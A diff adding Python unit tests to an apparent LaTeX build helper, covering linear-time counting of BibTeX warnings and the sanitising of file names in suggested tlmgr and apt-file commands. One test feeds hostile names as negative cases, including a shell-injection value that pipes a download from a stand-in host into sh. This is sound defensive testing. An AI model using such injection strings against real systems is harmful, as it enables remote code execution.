@@ -9,6 +9,7 @@ restrictions cause carry a specific next step.
 
 from __future__ import annotations
 
+import re
 import tempfile
 import time
 import unittest
@@ -194,6 +195,17 @@ class BibliographyLogTests(unittest.IsolatedAsyncioTestCase):
         self.assertEqual({item.severity for item in findings}, {"info"})
         self.assertIn("5 more warnings", findings[-1].message)
 
+    async def test_many_distinct_warnings_are_counted_in_linear_time(self) -> None:
+        # Looking each warning up in a list took 14 s for 80,000 distinct warnings.
+        count = 80_000
+        log = "".join(f"Warning--empty journal in key{number}\n" for number in range(count))
+        # A warning longer than a finding shows is still recognised when it repeats.
+        long_warning = "Warning--" + "x" * 3000 + "\n"
+        started = time.perf_counter()
+        findings = bibliography_log_findings(long_warning + log + long_warning, "main.tex")
+        self.assertLess(time.perf_counter() - started, 2.0)
+        self.assertIn(f"wrote {count + 1 - 20} more warnings", findings[-1].message)
+
     async def test_build_reports_the_warnings_of_its_blg(self) -> None:
         with tempfile.TemporaryDirectory() as directory:
             root = Path(directory)
@@ -270,6 +282,24 @@ class FailureHelpTests(unittest.IsolatedAsyncioTestCase):
         ):
             with self.subTest(message=message):
                 self.assertIsNone(explain_build_message(message))
+
+    def test_only_plain_file_names_from_the_log_reach_a_command_to_copy(self) -> None:
+        plain = explain_build_message("! LaTeX Error: File `my_style-2.0+x.sty' not found.")
+        self.assertIn("`tlmgr search --global --file /my_style-2.0+x.sty`", plain or "")
+        self.assertIn("`apt-file search my_style-2.0+x.sty`", plain or "")
+        # A document can print any such message with \typeout, so a name that is not plain
+        # stays out of every command, and the advice describes the search instead.
+        for name in (
+            "$(curl${IFS}evil.example|sh).sty",
+            "a;b.sty",
+            "naïve.sty",
+            "x" * 101 + ".sty",
+        ):
+            with self.subTest(name=name[:20]):
+                advice = explain_build_message(f"! LaTeX Error: File `{name}' not found.") or ""
+                self.assertIn("tlmgr's file search", advice)
+                commands = re.findall(r"`([^`]*)`", advice)
+                self.assertEqual(commands, ["sudo tlmgr install <package>"])
 
     def test_log_findings_carry_the_next_step(self) -> None:
         findings = log_findings(
